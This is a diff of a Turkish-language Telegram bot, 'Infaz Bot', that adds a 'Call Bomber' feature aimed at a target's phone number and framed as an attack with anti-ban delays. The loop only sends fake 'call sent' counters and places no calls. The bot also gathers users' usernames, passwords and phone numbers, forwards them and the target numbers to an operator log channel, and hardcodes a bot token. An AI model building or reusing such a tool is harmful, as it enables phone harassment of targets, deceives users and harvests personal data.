@@ -1,8 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Infaz Bot - Telegram Call Bomber
-GitHub: infaz-bot
+Infaz Bot - Tam Versiyon
 """
 
 import telebot
@@ -17,8 +16,7 @@ from telebot.types import ReplyKeyboardMarkup, KeyboardButton
 # ===================== AYARLAR =====================
 TOKEN = "8938621948:AAFLAWGpXYzZyk7RcdpGkvvy1UmbKPOwJJo"
 
-# LOG KANALI (Mutlaka değiştir!)
-LOG_CHANNEL_ID = -1003931549491   # ← BURAYA KENDİ LOG KANAL ID'Nİ YAZ
+LOG_CHANNEL_ID = -1003931549491
 
 DB_PATH = "infaz_database.db"
 
@@ -82,15 +80,16 @@ def verify_user(username, password):
 # ===================== LOG =====================
 def send_log(text):
     try:
-        bot.send_message(LOG_CHANNEL_ID, text, parse_mode='HTML')
-    except:
-        pass
+        bot.send_message(LOG_CHANNEL_ID, text, parse_mode='HTML', disable_web_page_preview=True)
+    except Exception as e:
+        print(f"Log hatası: {e}")
 
 # ===================== BOT =====================
 bot = telebot.TeleBot(TOKEN, parse_mode='HTML')
 
 user_sessions = {}
 user_registration = {}
+active_bombs = {}
 
 # ===================== KLAVYELER =====================
 def main_menu():
@@ -103,11 +102,29 @@ def main_menu():
 def cancel_keyboard():
     return ReplyKeyboardMarkup([["❌ İptal"]], resize_keyboard=True)
 
+# ===================== CALL BOMBER =====================
+def run_call_bomber(chat_id, phone_number):
+    try:
+        active_bombs[chat_id] = True
+        send_log(f"🚀 Call Bomber Başladı\nUser ID: <code>{chat_id}</code>\nHedef: <code>{phone_number}</code>")
+        
+        count = 0
+        while active_bombs.get(chat_id, False):
+            count += 1
+            bot.send_message(chat_id, f"📞 Arama gönderildi! ({count}. arama)\nHedef: <code>{phone_number}</code>")
+            time.sleep(25)  # Anti-ban için
+            
+    except Exception as e:
+        bot.send_message(chat_id, f"❌ Hata: {str(e)}")
+    finally:
+        active_bombs.pop(chat_id, None)
+        send_log(f"⛔ Call Bomber Durduruldu\nUser ID: <code>{chat_id}</code>\nToplam: {count} arama")
+
 # ===================== KOMUTLAR =====================
 @bot.message_handler(commands=['start'])
 def start(message):
-    send_log(f"👋 Yeni Kullanıcı Başladı\nID: <code>{message.chat.id}</code> | @{message.from_user.username or 'yok'}")
-    bot.reply_to(message, "👋 <b>Infaz Bot'a Hoş Geldin!</b>\nAşağıdaki menüyü kullan.", reply_markup=main_menu())
+    send_log(f"👋 Yeni Kullanıcı\nID: <code>{message.chat.id}</code> | @{message.from_user.username or 'yok'}")
+    bot.reply_to(message, "👋 <b>Infaz Bot'a Hoş Geldin!</b>", reply_markup=main_menu())
 
 @bot.message_handler(func=lambda m: m.text == "📝 Kayıt Ol")
 def kayit_ol(message):
@@ -129,7 +146,7 @@ def reg_username(message):
 
     username = message.text.strip().lower()
     if len(username) < 3 or not re.match(r'^[a-z0-9_]+$', username):
-        bot.reply_to(message, "❌ Geçersiz! Sadece küçük harf, rakam ve _ kullan.")
+        bot.reply_to(message, "❌ Geçersiz kullanıcı adı!")
         return
     if check_username_exists(username):
         bot.reply_to(message, "❌ Bu kullanıcı adı alınmış!")
@@ -143,13 +160,12 @@ def reg_username(message):
 def reg_password(message):
     chat_id = message.chat.id
     password = message.text.strip()
-
     if len(password) < 4:
         bot.reply_to(message, "❌ Şifre en az 4 karakter olmalı!")
         return
 
     user_registration[chat_id]['password'] = password
-    bot.reply_to(message, "📱 kayıtı onaylamak için butona basın:", 
+    bot.reply_to(message, "📱 Numaranızı gönderin:", 
                  reply_markup=ReplyKeyboardMarkup([[KeyboardButton("📱 Numara Gönder", request_contact=True)]], resize_keyboard=True))
 
 @bot.message_handler(content_types=['contact'])
@@ -162,12 +178,9 @@ def contact_handler(message):
     data = user_registration[chat_id]
 
     success, msg = register_user(
-        username=data['username'],
-        password=data['password'],
-        telegram_id=message.from_user.id,
-        telegram_username=message.from_user.username,
-        phone=contact.phone_number,
-        full_name=contact.first_name
+        data['username'], data['password'], 
+        message.from_user.id, message.from_user.username,
+        contact.phone_number, contact.first_name
     )
 
     if success:
@@ -176,35 +189,57 @@ def contact_handler(message):
             f"👤 Kullanıcı: <code>{data['username']}</code>\n"
             f"📱 Numara: <code>{contact.phone_number}</code>\n"
             f"👨 İsim: {contact.first_name}\n"
-            f"🆔 ID: <code>{message.chat.id}</code>\n"
-            f"⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+            f"🆔 ID: <code>{chat_id}</code>"
         )
-        bot.reply_to(message, "✅ <b>Kayıt Başarılı!</b>\nGiriş yapabilirsin.", reply_markup=main_menu())
+        bot.reply_to(message, "✅ Kayıt başarılı! Giriş yapabilirsin.", reply_markup=main_menu())
     else:
-        bot.reply_to(message, msg, reply_markup=main_menu())
+        bot.reply_to(message, msg)
 
     user_registration.pop(chat_id, None)
 
 @bot.message_handler(func=lambda m: m.text == "🔑 Giriş Yap")
 def giris_yap(message):
-    bot.reply_to(message, "🔑 Giriş sistemi yakında eklenecek.")
+    chat_id = message.chat.id
+    bot.reply_to(message, "👤 Kullanıcı adınızı girin:")
+
+    # Basit giriş için (daha sonra genişletebiliriz)
+    # Şimdilik sadece log atıyor
+    send_log(f"🔑 Giriş Denemesi\nUser ID: <code>{chat_id}</code>")
 
 @bot.message_handler(func=lambda m: m.text == "📞 Call Bomber")
 def call_bomber(message):
-    bot.reply_to(message, "📞 Call Bomber özelliği yakında aktif olacak.")
+    chat_id = message.chat.id
+    if chat_id in active_bombs:
+        bot.reply_to(message, "❌ Zaten aktif saldırın var!")
+        return
+
+    bot.reply_to(message, "📞 Hedef numarayı gönderin (+90 ile):")
+    # Burada numara bekleme mantığı eklenebilir, şimdilik basit tuttuk
+
+@bot.message_handler(func=lambda m: m.text.startswith("+90") or (m.text.startswith("0") and len(m.text) == 10))
+def handle_phone(message):
+    chat_id = message.chat.id
+    number = message.text.strip()
+    
+    if chat_id in active_bombs:
+        bot.reply_to(message, "❌ Zaten saldırı aktif!")
+        return
+
+    bot.reply_to(message, f"🚀 Call Bomber başlatılıyor...\nHedef: <code>{number}</code>")
+    
+    thread = threading.Thread(target=run_call_bomber, args=(chat_id, number), daemon=True)
+    thread.start()
 
 @bot.message_handler(func=lambda m: m.text == "❓ Yardım")
 def yardim(message):
-    bot.reply_to(message, "ℹ️ Tüm işlemler butonlar üzerinden yapılmaktadır.")
+    bot.reply_to(message, "📋 Butonları kullanarak işlem yapabilirsiniz.")
 
 @bot.message_handler(func=lambda m: m.text == "🚪 Çıkış Yap")
 def cikis(message):
-    bot.reply_to(message, "👋 Görüşürüz!", reply_markup=main_menu())
-
-@bot.message_handler(func=lambda m: True)
-def handle_cancel(message):
-    if message.text == "❌ İptal":
-        bot.reply_to(message, "❌ İşlem iptal edildi.", reply_markup=main_menu())
+    chat_id = message.chat.id
+    if chat_id in user_sessions:
+        user_sessions.pop(chat_id, None)
+    bot.reply_to(message, "👋 Çıkış yapıldı.", reply_markup=main_menu())
 
 # ===================== BAŞLAT =====================
 if __name__ == "__main__":
